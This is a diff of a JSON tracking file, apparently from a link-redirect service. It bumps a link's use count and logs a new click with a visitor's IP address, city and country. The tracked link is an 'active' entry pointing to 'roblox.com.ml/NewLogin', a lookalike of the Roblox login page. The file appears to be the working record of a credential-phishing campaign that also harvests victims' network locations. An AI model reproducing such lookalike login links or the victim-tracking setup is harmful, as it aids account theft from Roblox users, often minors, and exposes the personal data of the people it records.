@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 419,
+    "useCount": 420,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3464,6 +3464,14 @@
         "city": "Derby",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777051946960,
+        "ip": "88.166.168.73",
+        "country": "France",
+        "city": "Égletons",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
